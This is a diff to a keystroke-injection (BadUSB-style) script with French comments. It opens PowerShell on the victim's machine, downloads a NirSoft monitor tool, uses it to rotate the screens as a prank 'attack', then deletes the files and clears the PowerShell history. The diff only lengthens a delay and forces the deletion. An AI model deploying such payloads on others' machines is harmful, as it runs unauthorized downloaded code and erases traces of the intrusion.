@@ -20,7 +20,7 @@ DELAY 500
 REM Démarrage d'une fenêtre PowerShell
 ALTSTRING powershell
 ENTER
-DELAY 500
+DELAY 1000
 
 REM Téléchargement du programme
 ALTSTRING iwr https://www.nirsoft.net/utils/multimonitortool-x64.zip -out a.zip;
@@ -32,7 +32,7 @@ REM Exécution de l'attaque
 ALTSTRING 1..4|%{.\a\multimonitortool.exe /setorientation $_ 0};
 
 REM Nettoyage
-ALTSTRING remove-item a.zip,.\a -recurse;
+ALTSTRING remove-item a.zip,.\a -recurse -force;
 ALTSTRING clear (get-psreadlineoption).historysavepath;
 ALTSTRING exit
 
